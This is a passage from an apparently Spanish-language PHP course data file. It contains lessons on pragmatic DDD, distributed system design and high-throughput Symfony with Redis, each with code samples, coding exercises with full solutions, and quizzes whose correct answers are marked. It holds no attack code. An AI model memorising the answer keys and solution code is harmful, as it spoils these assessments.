                                'b' => 'En aplicaciones con lógica de negocio trivial o CRUDs estándar donde la complejidad de almacenamiento supera a la del negocio, ya que introducir capas, DTOs y mappers añade sobrecosto cognitivo sin retorno de inversión.',
                                'c' => 'Cuando se utiliza PHP 8.4.',
                                'd' => 'Cuando el equipo utiliza Git.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Hexagonal es una herramienta para dominar la complejidad de negocio. En sistemas orientados a formularios simples (CRUDs) o prototipos iniciales, la arquitectura estándar de 3 capas de Symfony es significativamente más eficiente y económica.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 10: LECCIÓN 2: Domain-Driven Design Pragmático
            // ==========================================
            'arch-pragmatic-ddd' => [
                'slug' => 'arch-pragmatic-ddd',
                'title' => 'Domain-Driven Design Pragmático',
                'module' => 'Arquitectura de Software',
                'minutes' => 65,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Domain-Driven Design (DDD) pragmático conecta el software con la realidad del negocio mediante un Lenguaje Ubicuo (Ubiquitous Language), Bounded Contexts y modelos de dominio ricos. A nivel táctico, el Aggregate Root (Raíz de Agregado) actúa como guardián estricto de la consistencia transaccional e invariantes de negocio. Se erradican los Modelos Anémicos repletos de getters y setters públicos pasivos, sustituyéndolos por métodos expresivos de intención ($order->cancel(Reason), $cart->addItem(Product, Quantity)) y Domain Events desacoplados.',
                    'problem' => 'El antipatrón del "Anemic Domain Model": entidades que son meros sacos de datos públicos donde cualquier servicio o controlador muta propiedades arbitrariamente ($order->setStatus("PAID")). Las reglas de negocio quedan desperdigadas en docenas de controladores y servicios auxiliares, provocando estados corruptos, inconsistencias financieras y duplicación masiva.',
                    'solution' => 'Encapsular el estado en Agregados ricos con métodos de negocio semánticos. Las invariantes de dominio se validan en el constructor o en los métodos mutadores del agregado, garantizando que un objeto jamás exista en un estado inválido. Uso de Value Objects inmutables para conceptos compuestos (Money, Email, Address) y emisión de Domain Events para efectos secundarios.',
                    'problem_label' => 'El Antipatrón del Modelo de Dominio Anémico y Estado Desprotegido:',
                    'solution_label' => 'La Solución: Agregados Ricos, Invariantes Protegidas y Eventos de Dominio:',
                ],
                'internals' => [
                    'title' => 'Anatomía del Aggregate Root y Transacciones en DDD',
                    'steps' => [
                        [
                            'phase' => '1. Aggregate Root como Límite Transaccional',
                            'description' => 'Un agregado es un racimo de entidades y Value Objects con una raíz única. La regla de oro: una transacción de base de datos debe modificar como máximo un único agregado para prevenir bloqueos distribuidos.',
                        ],
                        [
                            'phase' => '2. Erradicación de Setters y Encapsulamiento en PHP 8.4',
                            'description' => 'Las propiedades mutables se protegen con visibilidad privada y property hooks. Los métodos públicos expresan intenciones del negocio ($sub->pause(), $sub->resume()) en vez de mutaciones de bajo nivel ($sub->setStatus(2)).',
                        ],
                        [
                            'phase' => '3. Value Objects Inmutables frente a Tipos Primitivos',
                            'description' => 'Reemplazar floats y strings por Value Objects (Money, Currency, Quantity). Los Value Objects son inmutables por naturaleza y validan sus propias invariantes al instanciarse.',
                        ],
                        [
                            'phase' => '4. Domain Events para Desacoplamiento Asíncrono',
                            'description' => 'El agregado registra eventos en memoria ($this->recordThat(new SubscriptionCancelled(...))). Tras persistir el agregado en la base de datos, los eventos son publicados hacia Symfony Messenger o el EventDispatcher.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Subscription/Domain/Model/Subscription.php',
                    'title' => 'Agregado Rico de Dominio con Invariantes Protegidas y Registro de Eventos',
                    'tag' => 'DDD Rich Aggregate & Domain Events',
                    'code' => "declare(strict_types=1);

namespace App\Subscription\Domain\Model;

use App\Subscription\Domain\Event\SubscriptionCancelledEvent;
use App\Subscription\Domain\Event\SubscriptionCreatedEvent;
use App\Subscription\Domain\Exception\SubscriptionCannotBeCancelledException;
use DateTimeImmutable;

class Subscription
{
    /** @var object[] */
    private array \$domainEvents = [];

    private function __construct(
        private readonly string \$id,
        private readonly string \$customerId,
        private SubscriptionStatus \$status,
        private readonly DateTimeImmutable \$createdAt,
        private ?DateTimeImmutable \$cancelledAt = null
    ) {}

    public static function create(string \$id, string \$customerId): self
    {
        \$subscription = new self(
            \$id,
            \$customerId,
            SubscriptionStatus::Active,
            new DateTimeImmutable()
        );

        \$subscription->recordThat(new SubscriptionCreatedEvent(\$id, \$customerId));

        return \$subscription;
    }

    public function cancel(string \$reason): void
    {
        if (\$this->status === SubscriptionStatus::Cancelled) {
            throw new SubscriptionCannotBeCancelledException('La suscripción ya se encuentra cancelada.');
        }

        \$this->status = SubscriptionStatus::Cancelled;
        \$this->cancelledAt = new DateTimeImmutable();

        \$this->recordThat(new SubscriptionCancelledEvent(\$this->id, \$reason, \$this->cancelledAt));
    }

    public function isActive(): bool
    {
        return \$this->status === SubscriptionStatus::Active;
    }

    private function recordThat(object \$event): void
    {
        \$this->domainEvents[] = \$event;
    }

    /**
     * @return object[]
     */
    public function pullDomainEvents(): array
    {
        \$events = \$this->domainEvents;
        \$this->domainEvents = [];

        return \$events;
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior entiende que el verdadero retorno de inversión de Domain-Driven Design reside en el nivel Estratégico (Bounded Contexts, Context Mapping y Ubiquitous Language con los expertos de negocio), no en la pirotecnia táctica de crear clases para todo. Aplica agregados ricos únicamente en el Core Domain donde las reglas de negocio son complejas y críticas, protegiendo las fronteras transaccionales contra bloqueos y corrupción de datos.',
                    'critical_questions' => [
                        '¿Nuestras entidades tienen métodos que reflejan el lenguaje de los expertos de negocio o simples getters y setters mecánicos?',
                        '¿Estamos violando la regla de consistencia transaccional al intentar mutar dos raíces de agregado dentro de la misma transacción?',
                        '¿Qué partes de nuestro sistema pertenecen al Core Domain (ventaja competitiva) y cuáles son meros Dominios Genéricos o de Soporte?',
                        '¿Cómo coordinamos la publicación de Domain Events para garantizar que no se disparen si la transacción de base de datos hace rollback?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Actualizar el total de una orden de compra tras aplicar un cupón promocional con fecha de vigencia y descuento porcentual.',
                    'junior' => [
                        'approach' => 'En el controlador HTTP, extrae las líneas con getItems(), suma los subtotales con un bucle for, calcula el descuento manualmente y ejecuta setDiscount() y setTotalAmount() en la orden.',
                        'flaws' => [
                            'Modelo Anémico: la entidad Order no tiene control sobre su propio balance financiero.',
                            'Fuga de lógica crítica: si un comando CLI o webhook de pago edita la orden, el cálculo de descuento se ignora o se corrompe.',
                            'Cero protección contra invariantes: permite asignar totales negativos o cupones expirados sin validación.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'La orden expone el método de negocio $order->applyCoupon(Coupon $coupon). El agregado recalcula sus totales atómicamente, valida la fecha del cupón y emite un evento de dominio.',
                        'rationale' => [
                            'Consistencia garantizada: es matemáticamente imposible que la orden quede en un estado financiero desbalanceado.',
                            'Encapsulamiento absoluto: los controladores son meros despachadores que no conocen las fórmulas de descuento.',
                            'Auditabilidad transparente mediante el registro de eventos de dominio.',
                        ],
                        'trade_offs' => 'Exige mayor abstracción y modelado cuidadoso del ciclo de vida del agregado.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Agregado de Carrito de Compras con Invariantes Protegidas (Cart)',
                    'objective' => 'Implementar el agregado de dominio Cart protegiendo invariantes de negocio: cantidad mayor a cero y precio no negativo al agregar items (InvalidArgumentException), acumulación de cantidades para productos duplicados, cálculo de total redondeado a 2 decimales y prohibición de checkout en carrito vacío (DomainException).',
                    'instructions' => 'Completa el agregado Cart: implementa addItem validando que quantity sea mayor a 0 y unitPrice no negativo (lanzando InvalidArgumentException); si el productId ya existe en el carrito, incrementa su cantidad. Implementa removeItem para eliminar items por ID. Implementa getTotal retornando la suma de quantity * unitPrice de todos los items redondeada a 2 decimales con PHP_ROUND_HALF_UP. Implementa checkout validando que el carrito no esté vacío (lanzando DomainException) y retornando el total.',
                    'filename' => 'Cart.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Cart\\Domain;\n\nuse InvalidArgumentException;\nuse DomainException;\n\nclass CartItem\n{\n    public function __construct(\n        public readonly string \$productId,\n        public int \$quantity,\n        public readonly float \$unitPrice\n    ) {}\n}\n\nclass Cart\n{\n    /**\n     * @var array<string, CartItem>\n     */\n    private array \$items = [];\n\n    public function addItem(string \$productId, int \$quantity, float \$unitPrice): void\n    {\n        // TODO: Validar que \$quantity > 0 y \$unitPrice >= 0.0 (lanzar InvalidArgumentException)\n        // TODO: Añadir item o incrementar cantidad si ya existe\n    }\n\n    public function removeItem(string \$productId): void\n    {\n        // TODO: Eliminar el item del carrito si existe\n    }\n\n    public function getTotal(): float\n    {\n        // TODO: Calcular suma total de quantity * unitPrice con round(\$val, 2, PHP_ROUND_HALF_UP)\n        return 0.0;\n    }\n\n    public function checkout(): float\n    {\n        // TODO: Si el carrito está vacío, lanzar DomainException\n        // TODO: Retornar el total del carrito\n        return 0.0;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Cart\\Domain;\n\nuse InvalidArgumentException;\nuse DomainException;\n\nclass CartItem\n{\n    public function __construct(\n        public readonly string \$productId,\n        public int \$quantity,\n        public readonly float \$unitPrice\n    ) {}\n}\n\nclass Cart\n{\n    /**\n     * @var array<string, CartItem>\n     */\n    private array \$items = [];\n\n    public function addItem(string \$productId, int \$quantity, float \$unitPrice): void\n    {\n        if (\$quantity <= 0) {\n            throw new InvalidArgumentException('La cantidad agregada debe ser mayor a 0.');\n        }\n\n        if (\$unitPrice < 0.0) {\n            throw new InvalidArgumentException('El precio unitario no puede ser negativo.');\n        }\n\n        if (isset(\$this->items[\$productId])) {\n            \$this->items[\$productId]->quantity += \$quantity;\n        } else {\n            \$this->items[\$productId] = new CartItem(\$productId, \$quantity, \$unitPrice);\n        }\n    }\n\n    public function removeItem(string \$productId): void\n    {\n        unset(\$this->items[\$productId]);\n    }\n\n    public function getTotal(): float\n    {\n        \$total = 0.0;\n        foreach (\$this->items as \$item) {\n            \$total += \$item->quantity * \$item->unitPrice;\n        }\n\n        return round(\$total, 2, PHP_ROUND_HALF_UP);\n    }\n\n    public function checkout(): float\n    {\n        if (empty(\$this->items)) {\n            throw new DomainException('No se puede procesar el checkout de un carrito de compras vacío.');\n        }\n\n        return \$this->getTotal();\n    }\n}\n",
                    'explanation' => 'Un Aggregate Root en DDD no es una simple tabla con getters y setters, sino el guardián de la integridad de los datos. Al blindar las mutaciones con métodos semánticos (addItem, checkout), el modelo garantiza que nunca existan items con cantidades negativas o carritos en estados financiera y transaccionalmente imposibles.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Domain-Driven Design Pragmático',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es el peligro primordial del antipatrón "Anemic Domain Model" (Modelo de Dominio Anémico) en aplicaciones complejas?',
                            'options' => [
                                'a' => 'Hace que las plantillas Twig se compilen más lento.',
                                'b' => 'Convierte las entidades en meras bolsas pasivas de datos con getters y setters públicos, desparramando las reglas de validación y cálculo en controladores y servicios externos, provocando inconsistencias y estados corruptos.',
                                'c' => 'Doctrine prohíbe el uso de getters y setters en PHP 8.4.',
                                'd' => 'Obliga a reiniciar el servidor web en cada petición.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'En un modelo anémico, las entidades carecen de comportamiento protector. Cualquier parte del código puede alterar su estado sin validar invariantes, dispersando la lógica de negocio y haciendo imposible garantizar la coherencia.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la regla canónica de diseño sobre las fronteras transaccionales de un Aggregate Root en DDD?',
                            'options' => [
                                'a' => 'Una transacción de base de datos debe modificar como máximo una única raíz de agregado a la vez para preservar la consistencia y evitar contención y bloqueos distribuidos.',
                                'b' => 'Una transacción debe modificar obligatoriamente todos los agregados de la base de datos a la vez.',
                                'c' => 'Los agregados no pueden interactuar con bases de datos transaccionales.',
                                'd' => 'Los agregados solo deben existir en memoria caché Redis.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Limitar cada transacción a un único agregado previene deadlocks en base de datos, reduce el acoplamiento y facilita la escalabilidad horizontal o particionamiento futuro del sistema.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => 'En la disciplina de Domain-Driven Design, ¿qué componente aporta mayor valor de negocio a largo plazo según Eric Evans?',
                            'options' => [
                                'a' => 'El diseño táctico (crear Aggregates, Entities y Repositories con muchas interfaces).',
                                'b' => 'El diseño estratégico (delimitación de Bounded Contexts, Ubiquitous Language con los expertos del dominio y alineación con el Core Domain).',
                                'c' => 'La instalación de Symfony Flex.',
                                'd' => 'El uso exclusivo de bases de datos NoSQL.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El valor supremo de DDD es estratégico: comprender profundamente el modelo de negocio, unificar el vocabulario entre desarrolladores y expertos (Lenguaje Ubicuo) y delimitar contextos para evitar dependencias cruzadas.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 11: LECCIÓN 1: Laboratorio Interactivo de Arquitecturas Distribuidas
            // ==========================================
            'system-design-canvas' => [
                'slug' => 'system-design-canvas',
                'title' => 'Laboratorio Interactivo de Arquitecturas Distribuidas',
                'module' => 'System Design Lab',
                'minutes' => 60,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El diseño de sistemas distribuidos a gran escala trasciende el código PHP para centrarse en la topología de red, el Teorema CAP (Consistencia, Disponibilidad, Tolerancia a Particiones), el Teorema PACELC y el desacoplamiento de estado. En una arquitectura de alta disponibilidad, los servidores PHP-FPM operan en modo completamente Stateless (sin estado local) detrás de balanceadores de carga redundantes L4/L7. El almacenamiento de sesión y caché se delega a clústeres de Redis Sentinel/Cluster, y la persistencia relacional a MySQL con topología Primaria-Réplicas asíncronas con failover automático.',
                    'problem' => 'El antipatrón del "Servidor Monolítico con SPOF (Single Point of Failure)": desplegar Nginx, PHP-FPM, MySQL, Redis y sesiones en disco dentro de una única máquina virtual. Cuando el tráfico se cuadruplica o el disco se llena con logs, toda la empresa colapsa sin tolerancia a fallos ni capacidad de recuperación automática ante desastres.',
                    'solution' => 'Arquitectura desacoplada y elástica: capa web stateless balanceada mediante algoritmos L7 (Least Connections) con terminación SSL; separación de lecturas y escrituras en base de datos con réplicas de lectura; patrón Cache-Aside con mitigación de Cache Stampede; y aislamiento de llamadas remotas mediante Circuit Breakers con estados Closed, Open y Half-Open.',
                    'problem_label' => 'El Antipatrón del Servidor Único y Cuellos de Botella Centralizados:',
                    'solution_label' => 'La Solución: Desacoplamiento Stateless, Replicación y Resiliencia Distribuida:',
                ],
                'internals' => [
                    'title' => 'Topología de Red, Replicación y Mitigación de SPOFs',
                    'steps' => [
                        [
                            'phase' => '1. Balanceo de Carga L4 vs L7',
                            'description' => 'L4 opera a nivel de paquetes TCP/UDP con máxima velocidad y bajo consumo de CPU (HAProxy/AWS NLB). L7 opera a nivel HTTP, permitiendo ruteo inteligente de URLs, rate limiting granular, sticky sessions y compresión gzip/brotli.',
                        ],
                        [
                            'phase' => '2. Replicación Primaria-Réplica y Lag de Sincronización',
                            'description' => 'Las escrituras se canalizan exclusivamente al Primary (InnoDB ACID). Las réplicas replican vía Binary Log de forma asíncrona. Para mitigar el lag en lecturas posteriores inmediatas a una escritura, se fuerza temporalmente la lectura al Primary (Read-Your-Own-Writes).',
                        ],
                        [
                            'phase' => '3. Mitigación de Cache Stampede (Thundering Herd)',
                            'description' => 'Cuando un elemento de caché altamente demandado expira, miles de peticiones concurrentes golpean la base de datos simultáneamente. Se mitiga mediante bloqueos distribuidos (Redlock) o expiración temprana probabilística (algoritmo XFetch).',
                        ],
                        [
                            'phase' => '4. Circuit Breakers y Degradación Elegante',
                            'description' => 'Si un microservicio o pasarela de pago falla reiteradamente, el Circuit Breaker pasa al estado Open, evitando saturar los workers de PHP-FPM y devolviendo de inmediato una respuesta de fallback en milisegundos.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/SystemDesign/CircuitBreaker/CircuitBreaker.php',
                    'title' => 'Implementación de Circuit Breaker de Tres Estados en PHP 8.4',
                    'tag' => 'System Design & Circuit Breaker Pattern',
                    'code' => "declare(strict_types=1);

namespace App\SystemDesign\CircuitBreaker;

use Closure;
use RuntimeException;

enum CircuitState: string
{
    case Closed = 'CLOSED';       // Tráfico normal fluyendo
    case Open = 'OPEN';           // Cortocircuito activo, peticiones bloqueadas
    case HalfOpen = 'HALF_OPEN';  // Probando recuperación con tráfico reducido
}

class CircuitBreaker
{
    private CircuitState \$state = CircuitState::Closed;
    private int \$failureCount = 0;
    private float \$lastFailureTime = 0.0;

    public function __construct(
        private readonly int \$failureThreshold = 5,
        private readonly float \$cooldownTimeoutSeconds = 30.0
    ) {}

    public function execute(Closure \$action, Closure \$fallback): mixed
    {
        \$now = microtime(true);

        if (\$this->state === CircuitState::Open) {
            if (\$now - \$this->lastFailureTime > \$this->cooldownTimeoutSeconds) {
                \$this->state = CircuitState::HalfOpen;
            } else {
                return \$fallback(new RuntimeException('Circuit Breaker está abierto. Servicio temporalmente no disponible.'));
            }
        }

        try {
            \$result = \$action();

            if (\$this->state === CircuitState::HalfOpen) {
                \$this->state = CircuitState::Closed;
                \$this->failureCount = 0;
            }

            return \$result;
        } catch (\\Throwable \$e) {
            \$this->failureCount++;
            \$this->lastFailureTime = \$now;

            if (\$this->failureCount >= \$this->failureThreshold) {
                \$this->state = CircuitState::Open;
            }

            return \$fallback(\$e);
        }
    }

    public function getState(): CircuitState
    {
        return \$this->state;
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior en System Design no optimiza a ciegas. Calcula primero las métricas de tráfico: QPS pico, tamaño medio de payload, ancho de banda saturado y capacidad de memoria del clúster. Entiende que la consistencia fuerte tiene un costo brutal de latencia y disponibilidad según el teorema CAP, y diseña sistemas tolerantes a particiones de red donde la degradación parcial es una característica planificada.',
                    'critical_questions' => [
                        '¿Cómo se comporta nuestra plataforma cuando el nodo maestro de MySQL cae durante el pico de ventas del Black Friday?',
                        '¿Tenemos balanceadores de carga redundantes con Keepalived/VRRP para evitar que el propio proxy inverso sea un SPOF?',
                        '¿Nuestras sesiones de usuario están en Redis para que cualquier nodo PHP-FPM pueda atender cualquier petición sin afinidad de IP?',
                        '¿Qué estrategia de invalidación de caché estamos aplicando: TTL pasivo, eventos de dominio o invalidación por tags?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Gestionar la caída temporal de una API externa de geolocalización que ralentiza el checkout a más de 15 segundos por petición.',
                    'junior' => [
                        'approach' => 'Deja que las peticiones se queden bloqueadas esperando el timeout de 30 segundos de curl, saturando todos los workers de PHP-FPM hasta que Nginx devuelve 504 Gateway Timeout a todos los usuarios.',
                        'flaws' => [
                            'Efecto dominó: una API secundaria externa bloquea la capacidad de facturación de toda la tienda.',
                            'Consumo desmedido de memoria y procesos workers colgados en llamadas bloqueantes.',
                            'Cero observabilidad sobre la tasa de error del proveedor externo.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Envuelve la llamada en un Circuit Breaker con timeout de 800ms. Tras 5 fallos consecutivos, abre el circuito y sirve coordenadas aproximadas desde caché o IP local de forma instantánea.',
                        'rationale' => [
                            'Aislamiento total de fallos: la plataforma sigue funcionando a máxima velocidad con degradación elegante.',
                            'Workers de PHP liberados inmediatamente sin bloqueos síncronos.',
                            'Recuperación automática mediante el estado Half-Open tras cumplirse el tiempo de enfriamiento.',
                        ],
                        'trade_offs' => 'Requiere diseñar estrategias de fallback coherentes con el negocio.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de un Gestor de Cache-Aside con TTL y Mutex (CacheAsideManager)',
                    'objective' => 'Implementar la clase CacheAsideManager que gestione el patrón Cache-Aside: consultar el almacenamiento en memoria, validar que la clave no sea vacía y el TTL mayor a 0 (lanzando InvalidArgumentException), ejecutar el callback de obtención ante un cache miss o dato expirado, almacenar el valor con su marca de expiración y retornar el dato.',
                    'instructions' => 'Completa CacheAsideManager: implementa get(string $key, int $ttlSeconds, Closure $fallback): mixed. Valida que $key (tras trim) no sea vacía y que $ttlSeconds sea mayor a 0 (de lo contrario lanza InvalidArgumentException). Si la clave existe en $this->storage y no ha expirado (microtime(true) < expires_at), retorna su valor. Si no existe o expiró, ejecuta $fallback(), guarda el resultado en $this->storage con expires_at = microtime(true) + $ttlSeconds y retorna el valor. Implementa invalidate para borrar claves del almacenamiento.',
                    'filename' => 'CacheAsideManager.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\SystemDesign\\Cache;\n\nuse InvalidArgumentException;\nuse Closure;\n\nclass CacheAsideManager\n{\n    /**\n     * @var array<string, array{value: mixed, expires_at: float}>\n     */\n    private array \$storage = [];\n\n    public function get(string \$key, int \$ttlSeconds, Closure \$fallback): mixed\n    {\n        // TODO: Validar que \$key (tras trim) no sea vacía (InvalidArgumentException)\n        // TODO: Validar que \$ttlSeconds > 0 (InvalidArgumentException)\n        // TODO: Si existe en \$this->storage y no ha expirado (microtime(true) < expires_at), retornar valor\n        // TODO: Si es miss o ha expirado, ejecutar \$fallback(), guardar con expires_at y retornar valor\n        return null;\n    }\n\n    public function invalidate(string \$key): void\n    {\n        unset(\$this->storage[trim(\$key)]);\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\SystemDesign\\Cache;\n\nuse InvalidArgumentException;\nuse Closure;\n\nclass CacheAsideManager\n{\n    /**\n     * @var array<string, array{value: mixed, expires_at: float}>\n     */\n    private array \$storage = [];\n\n    public function get(string \$key, int \$ttlSeconds, Closure \$fallback): mixed\n    {\n        \$cleanKey = trim(\$key);\n        if (\$cleanKey === '') {\n            throw new InvalidArgumentException('La clave de caché no puede estar vacía.');\n        }\n\n        if (\$ttlSeconds <= 0) {\n            throw new InvalidArgumentException('El tiempo de vida (TTL) debe ser mayor a 0 segundos.');\n        }\n\n        \$now = microtime(true);\n\n        if (isset(\$this->storage[\$cleanKey])) {\n            \$item = \$this->storage[\$cleanKey];\n            if (\$now < \$item['expires_at']) {\n                return \$item['value'];\n            }\n            unset(\$this->storage[\$cleanKey]);\n        }\n\n        \$computedValue = \$fallback();\n\n        \$this->storage[\$cleanKey] = [\n            'value' => \$computedValue,\n            'expires_at' => \$now + (float) \$ttlSeconds,\n        ];\n\n        return \$computedValue;\n    }\n\n    public function invalidate(string \$key): void\n    {\n        unset(\$this->storage[trim(\$key)]);\n    }\n}\n",
                    'explanation' => 'El patrón Cache-Aside es la base del caching distribuido moderno. La aplicación asume la responsabilidad de consultar primero el almacenamiento temporal y solo recurrir al backend costoso (base de datos o API externa) ante un cache miss, poblando el caché para subsecuentes consultas concurrentes.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Arquitecturas Distribuidas & System Design',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la diferencia primordial entre balanceo de carga en Capa 4 (L4) y Capa 7 (L7)?',
                            'options' => [
                                'a' => 'L4 solo procesa tramas a nivel de paquetes TCP/UDP sin inspeccionar el contenido HTTP, ofreciendo máxima velocidad y mínimo uso de CPU; L7 inspecciona encabezados, cookies y rutas HTTP, permitiendo ruteo inteligente y terminación SSL.',
                                'b' => 'L4 solo funciona en la nube de Google y L7 en AWS.',
                                'c' => 'L4 requiere que PHP esté compilado en modo seguro y L7 no.',
                                'd' => 'Son idénticos y procesan exactamente los mismos protocolos.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'L4 opera a nivel de transporte (TCP/IP) reenviando paquetes sin descifrar HTTP. L7 opera en la capa de aplicación, lo que permite evaluar URIs (/api vs /static), cabeceras de autenticación y balanceo contextual.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cómo mitiga una arquitectura Senior el problema del Replication Lag (retraso de replicación) tras una escritura crítica en MySQL?',
                            'options' => [
                                'a' => 'Desactivando la base de datos réplica para siempre.',
                                'b' => 'Enrutando las lecturas del usuario que acaba de escribir hacia el nodo Primary durante una pequeña ventana de tiempo (estrategia Read-Your-Own-Writes), mientras los demás usuarios continúan leyendo de las réplicas.',
                                'c' => 'Reiniciando el servidor web después de cada INSERT.',
                                'd' => 'Configurando todas las tablas en formato MyISAM.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Forzar lecturas al nodo Primary para el usuario que ejecutó la mutación durante unos segundos (mediante una cookie o marca de tiempo en sesión) garantiza consistencia inmediata de su propia vista sin sobrecargar el Primary con las lecturas globales.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué es el fenómeno de Cache Stampede (o Thundering Herd) y cómo se previene?',
                            'options' => [
                                'a' => 'Es cuando un virus informático borra la memoria RAM del servidor.',
                                'b' => 'Ocurre cuando expira una clave de caché altamente concurrente y miles de peticiones simultáneas impactan la base de datos a la vez; se previene usando bloqueos distribuidos (mutex) o expiración anticipada probabilística (algoritmo XFetch).',
                                'c' => 'Es un error de sintaxis en el archivo php.ini.',
                                'd' => 'Ocurre cuando Redis se queda sin espacio de disco duro.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Al expirar una clave caliente, todas las peticiones intentan recalcularla simultáneamente. Usar un bloqueo mutex permite que solo 1 worker recalcule el valor mientras los demás esperan o reciben datos ligeramente obsoletos (stale-while-revalidate).',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 11: LECCIÓN 2: Caso: 10,000 Requests/sec en Symfony + Redis
            // ==========================================
            'system-design-high-throughput' => [
                'slug' => 'system-design-high-throughput',
                'title' => 'Caso: 10,000 Requests/sec en Symfony + Redis',
                'module' => 'System Design Lab',
                'minutes' => 55,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Alcanzar un caudal de 10,000 peticiones por segundo (10k RPS) en una infraestructura basada en PHP 8.4 y Symfony exige optimización simbiótica en todas las capas del stack: Kernel de Linux, servidor web Nginx, administrador de procesos PHP-FPM, contenedor de dependencias de Symfony y almacenamiento en memoria Redis. Se erradican las operaciones de disco, se configura PHP-FPM con pm=static y OpCache Preloading, y se utilizan Redis Pipelines y scripts Lua para minimizar el Round-Trip Time (RTT) a niveles sub-milisegundo.',
                    'problem' => 'El temido "Cuello de Botella de los 500 RPS": clústeres enteros de servidores con 32 cores colapsando a solo 500 peticiones por segundo debido al agotamiento del pool de conexiones de base de datos (DB connection starvation), bloqueos síncronos en escrituras lentas y el costo de recrear árboles de dependencias en cada petición.',
                    'solution' => 'Arquitectura de Ingesta Asíncrona: el endpoint HTTP valida el esquema en memoria pura, coloca el evento en un buffer de Redis en memoria en < 1ms mediante Unix Domain Sockets, y devuelve de inmediato HTTP 202 Accepted. Un pool dedicado de workers de Symfony Messenger procesa los eventos en lotes (batch processing) e inserta masivamente en base de datos sin saturar conexiones.',
                    'problem_label' => 'El Antipatrón del Bloqueo Síncrono a 500 RPS:',
                    'solution_label' => 'La Solución: OpCache Preloading, Buffering en Redis y Workers Asíncronos a 10k RPS:',
                ],
                'internals' => [
                    'title' => 'Optimización de Rendimiento Extremo: Kernel, PHP-FPM y Redis Pipelines',
                    'steps' => [
                        [
                            'phase' => '1. Configuración de Kernel y Nginx para 10k Concurrencia',
                            'description' => 'Ajuste de net.core.somaxconn=65535 y net.ipv4.tcp_max_syn_backlog para absorber ráfagas de conexión; configuración de worker_rlimit_nofile=65535 y keepalive_timeout en Nginx para reutilizar canales TCP abiertos.',
                        ],
                        [
                            'phase' => '2. PHP-FPM Estático y OpCache Preloading en PHP 8.4',
                            'description' => 'Configurar pm = static elimina la sobrecarga de fork/kill dinámico de procesos workers. Con opcache.preload, todo el framework Symfony y las entidades de dominio se compilan en memoria SHM al arrancar el servidor, reduciendo el overhead de arranque a cero.',
                        ],
                        [
                            'phase' => '3. Reducción de RTT con Redis Pipelines y Unix Sockets',
                            'description' => 'La comunicación a través de Unix Domain Sockets (/var/run/redis/redis.sock) elimina la sobrecarga de la pila TCP/IP de loopback. El uso de pipelining agrupa N comandos en un único viaje de red, multiplicando el throughput por diez.',
                        ],
                        [
                            'phase' => '4. Desacoplamiento con HTTP 202 Accepted',
                            'description' => 'Convertir mutaciones pesadas en peticiones asíncronas con respuesta HTTP 202 Accepted y cabecera de seguimiento. El trabajo pesado se traslada a consumidores de fondo sin bloquear el ciclo de vida del Request web.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/SystemDesign/HighThroughput/HighThroughputEventIngestor.php',
                    'title' => 'Ingestor de Eventos de Alta Frecuencia con Redis Pipeline en Microsegundos',
                    'tag' => 'High Throughput & Redis Pipeline',
                    'code' => "declare(strict_types=1);

namespace App\SystemDesign\HighThroughput;

use Redis;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Response;

class HighThroughputEventIngestor
{
    public function __construct(
        private readonly Redis \$redisClient
    ) {}

    /**
     * Procesa la ingesta en < 1 milisegundo encolando en Redis mediante Pipeline
     *
     * @param array<string, mixed> \$payload
     */
    public function ingest(array \$payload): JsonResponse
    {
        \$eventId = \$payload['event_id'] ?? null;
        \$eventType = \$payload['type'] ?? null;

        if (!is_string(\$eventId) || !is_string(\$eventType) || \$eventId === '' || \$eventType === '') {
            return new JsonResponse(['error' => 'Payload inválido'], Response::HTTP_UNPROCESSABLE_ENTITY);
        }

        // Serialización ultrarrápida nativa JSON
        \$serialized = json_encode(\$payload, JSON_THROW_ON_ERROR);

        // Redis Pipeline: agrupa múltiples operaciones en un solo envío atómico de socket
        \$pipeline = \$this->redisClient->pipeline();
        \$pipeline->lPush('stream:events:buffer', \$serialized);
        \$pipeline->hIncrBy('metrics:events:counter', \$eventType, 1);
        \$pipeline->exec();

        // Respuesta inmediata HTTP 202 Accepted para no bloquear el worker de PHP
        return new JsonResponse([
